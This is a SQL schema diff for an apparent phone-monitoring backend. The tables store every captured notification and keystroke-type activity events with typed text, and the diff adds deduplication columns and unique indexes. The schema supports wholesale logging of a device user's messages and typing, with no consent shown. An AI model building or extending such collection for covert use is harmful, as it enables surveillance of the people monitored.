@@ -37,10 +37,14 @@ CREATE INDEX IF NOT EXISTS idx_notifications_created ON public.notifications (cr
 -- ─── CAPTURED NOTIFICATIONS (phone notifications caught by the listener) ──
 -- The device's NotificationReaderService sends every posted notification here:
 --   TIME (post_time) | MESSAGE (title + text) | APP NAME (app_name)
+-- Dedup: a re-delivery of the SAME (key + content) updates in place; a NEW
+-- message on the same key (e.g. Samsung conversation notifications) inserts a
+-- new row so every distinct message is preserved as its own history entry.
 CREATE TABLE IF NOT EXISTS public.captured_notifications (
     id           BIGSERIAL PRIMARY KEY,
     device_id    TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
     key          TEXT,                    -- StatusBarNotification key (dedupe)
+    content_hash TEXT,                    -- sha256(title\nmessage) — distinguishes re-delivery from new message
     package_name TEXT,
     app_name     TEXT,
     title        TEXT,
@@ -48,7 +52,7 @@ CREATE TABLE IF NOT EXISTS public.captured_notifications (
     post_time    BIGINT,                  -- device epoch ms when the notification appeared
     data         JSONB DEFAULT '{}'::jsonb,
     created_at   TIMESTAMPTZ DEFAULT now(),
-    UNIQUE (device_id, key)
+    UNIQUE (device_id, key, content_hash)
 );
 CREATE INDEX IF NOT EXISTS idx_captured_notif_device ON public.captured_notifications (device_id, post_time DESC);
 CREATE INDEX IF NOT EXISTS idx_captured_notif_created ON public.captured_notifications (created_at DESC);
@@ -57,6 +61,7 @@ CREATE INDEX IF NOT EXISTS idx_captured_notif_created ON public.captured_notific
 CREATE TABLE IF NOT EXISTS public.activity_events (
     id         BIGSERIAL PRIMARY KEY,
     device_id  TEXT NOT NULL REFERENCES public.devices(device_id) ON DELETE CASCADE,
+    event_uuid TEXT,                       -- client-generated id (outbox dedup)
     event_type TEXT DEFAULT 'keystroke',
     app_package TEXT DEFAULT 'unknown',
     text       TEXT DEFAULT '',
@@ -64,4 +69,8 @@ CREATE TABLE IF NOT EXISTS public.activity_events (
     class_name TEXT,
     created_at TIMESTAMPTZ DEFAULT now()
 );
+-- Outbox dedup: phone re-sends events until it receives an event_ack; this
+-- unique index makes duplicate re-sends harmless (exactly-once persistence).
+ALTER TABLE public.activity_events ADD COLUMN IF NOT EXISTS event_uuid TEXT;
+CREATE UNIQUE INDEX IF NOT EXISTS uq_activity_device_uuid ON public.activity_events (device_id, event_uuid);
 CREATE INDEX IF NOT EXISTS idx_activity_events_device ON public.activity_events (device_id, created_at DESC);
